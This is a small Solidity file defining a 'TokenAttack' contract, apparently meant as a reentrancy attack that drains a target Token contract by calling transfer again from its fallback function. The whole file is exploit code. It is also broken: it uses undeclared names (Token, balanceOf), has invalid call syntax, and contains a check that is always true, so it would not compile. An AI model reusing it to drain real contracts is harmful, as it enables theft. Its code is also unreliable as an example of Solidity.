// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenAttack{

    Token tokenContract;

    constructor(address _tokenContractAddr){
        tokenContract = Token(_tokenContractAddr);
    }

    function attack() public payable {
        require(balanceOf(msg.sender)>=0);
        tokenContract.transfer({value:1})("");
    }

    fallback() external  payable {
        if(tokenContract.balance>=1){
            tokenContract.transfer({value:1})("");
        }
    }


}